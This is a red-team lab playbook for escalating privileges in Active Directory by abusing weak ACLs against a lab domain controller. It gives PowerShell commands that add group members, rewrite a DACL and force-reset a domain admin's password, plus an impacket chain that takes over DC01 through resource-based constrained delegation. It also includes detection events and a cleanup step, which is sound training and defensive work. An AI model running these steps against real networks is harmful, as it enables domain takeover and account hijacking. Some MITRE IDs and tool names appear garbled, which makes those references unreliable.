# Playbook 04 — ACL Abuse & Privilege Escalation: GenericAll, WriteDacl, ForceChangePassword, RBCD

> **Stage:** Privilege Escalation / Persistence (MITRE T1548.002/T1228, T1098.002, T1558.002)
> **Toolset:** BloodHound, `tools/acl_scanner.py`, `impacket addcomputer.py` / `rubGCAttribute`, Rubeus
> **Goal:** Convert the *graph edges* found in playbook 01 into **local lab
> takeovers** using the exact insecure DACLs in `configs/vulnerable-acls.json`.

---

## 1. Why DACL edges ARE the escalation

Access control in AD is not a boolean "admin or not". Every object has an ACL —
the **DACL** — defining which trustees have which rights. Two rights are
Tier-breaking:

| Right | Meaning v. an attacker |
|-------|------------------------|
| **GenericAll** | full control over the object (add yourself to a group, reset SPNs, rewrite attributes) |
| **WriteDacl** | rewrite the DACL itself — grant *yourself* GenericAll, then walk the object |
| **WriteOwner** | take ownership, then you're effectively DA on that object |
| **ForceChangePassword** (extended right `User-Force-Change-Password`) | reset the victim's password — instant ATO for a user target |
| **AllowedToActOnBehalfOfOtherIdentity (RBCD)** | tell the target computer "trust principal X as a source of delegation" → request tickets as any server |

The lab's vulnerable edges (injected by `configs/vulnerable-acls.json`):

```
t2-user ----GenericAll--------------> Tier1-Admins      (acl-001)
t1-admin ----WriteDacl-------------> SQL-Admins          (acl-002)
k.salim ----ForceChangePassword----> darc-admin           (acl-003)
svc-rbcd ----AllowedToAct----------> DC01$                (acl-004)
```

## 2. Confirm the edges (audit-side + attack-side)

```bash
# With our own parser (offline-parity for CI, or against the live DC):
python -m tools.acl_scanner --server 192.168.56.10 \
  --user 'CORP\t2-user' --password 'LabStart!22445' --rbcd \
  --min-right GenericAll --min-right WriteDacl --min-right ForceChangePassword

# The /sddl offline mode validates your tooling against a canned primitive:
python -m tools.acl_scanner --sddl 'D:(A;;GA;;;WD)(A;;WP;00299570-246d-11d0-a768-00aa006e0529;;PS)'
```

```powershell
# BloodHound confirmation (Neo4j):
MATCH p=shortestPath((a {name:'T2-USER@CORP.LOCAL'})-[*1..3]->(b {name:'
  DOMAIN ADMINS@CORP.LOCAL'})) RETURN p
```

## 3. GenericAll → group membership (acl-001)

```powershell
# Now that t2-user has GenericAll on Tier1-Admins, escalate to member:
Add-ADGroupMember -Identity "Tier1-Admins" -Members t2-user
Get-ADGroupMember -Identity "Tier1-Admins"     # verify

# And from there, the classic ADCS/cert path or DCSync (playbook 05) begins.
```

### Why it works
`GenericAll` on a **group** includes "modify membership" — the DACL is
authorizing it, nothing else is consulted.

## 4. WriteDacl → DACL weaponization (acl-002)

```powershell
# 1. Take the object, rewrite ITS DACL to grant yourself GenericAll:
$target = [System.DirectoryServices.DirectoryEntry]("LDAP://CN=SQL-Admins,OU=ServiceAccounts,OU=Tier1,DC=corp,DC=local")
$acl = $target.ObjectSecurity
$acl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    (New-Object System.Security.Principal.NTAccount("CORP\t1-admin")),
    [System.DirectoryServices.ActiveDirectoryRights]'GenericAll', 'Allow')))
$target.CommitChanges()
# 2. Now t1-admin owns SQL-Admins like the GenericAll case.
Add-ADGroupMember -Identity "SQL-Admins" -Members t1-admin
```

### Why it works
You already possess `WriteDacl` on the group; WriteDacl means "I am the DACL
author" — self-granting GenericAll is a single ACE append.

## 5. ForceChangePassword → DA password reset (acl-003)

```powershell
$da = Get-ADUser darc-admin
Set-ADAccountPassword -Identity darc-admin -NewPassword (ConvertTo-SecureString 'newDA#22445' -AsPlainText -Force)
# Authenticate as the DA right now:
runas /netonly /user:CORP\darc-admin cmd.exe
```

### Defensive artifact
Event **4738** (`A user account was changed`) + a password-set on the DA
correlate with the FCP control-access GUID — this single line of PowerShell is
your SOC's **"automated DA takeover detector"** test case.

## 6. RBCD → computer takeover (acl-004)

We set `svc-rbcd → AllowedToAct → DC01$`. The play is:

```bash
# 1) Attacker registers a NEW computer account (addcomputer):
python3 addcomputer.py -method LDAPS -computer-name ATTACKER\$ -computer-pass Pwnd321 \
  -dc-host 192.168.56.10 -domain-netbios CORP 'CORP/svc-rbcd:LabStart!22445' -baseDN 'CN=Computers,DC=corp,DC=local'

# 2) Grant that computer RBCD rights on the *target* computer (DC01$):
python3 rbcd.py -delegate-to 'DC01$' -delegate-from 'ATTACKER$' \
  -dc-ip 192.168.56.10 -action write -use-ldaps 'CORP/svc-rbcd:LabStart!22445'

# 3) Request a service ticket for DC01's machine account services as ATTACKER$:
python3 getST.py -spn 'cifs/dc01.corp.local' -impersonate admin 'CORP/ATTACKER$:Pwnd321' -dc-ip 192.168.56.10
#   -> ticket in admin.ccache; use with KRB5CCNAME:
export KRB5CCNAME=admin.ccache
python3 wmiexec.py -k -no-pass 'CORP/admin@dc01.corp.local'
```

### Why it works
RBCD flips the delegation direction: the **target** computer says "I trust these
principals to request service tickets as *anything else*". Since DC01 grants
AccessAllowedToAct to `ATTACKER$`, `getST -impersonate admin` yields a ticket
that authenticates as admin on any of DC01's S4U2Self/S4U2Proxy services.

### Detection
Event **4768/4769** for `ATTACKER$`, **5136** writing
`msDS-AllowedToActOnBehalfOfOtherIdentity` (Sigma `1b2a3c4d`) — the attr that
`cleanup.ps1` clears and that the mitigation matrix forbids on Tier-0 computers.

## 7. Cleanup & Verification

```powershell
# Revert every injected DACL + RBCD + group membership:
.\cleanup.ps1 -ResetLab
# Re-audit: must show ZERO vulnerable ACEs:
python -m tools.acl_scanner --server 192.168.56.10 --user 'CORP\restore-user' --password ...
```

---

## Theory — "The graph doesn't lie, but the DACL does"

Every escalation above is a **read of the graph producing a single write to an
object**. BloodHound says "t2-user → GenericAll → Tier1-Admins" — the actual
write is `Add-ADGroupMember`. The reason DACL edges are so pervasively
under-detected: **Event 5136 only logs attribute writes when "Audit DS Access"
object-level auditing is on**, and many orgs never enable it. The mitigation
matrix makes object auditing a lab baseline so your detections are real.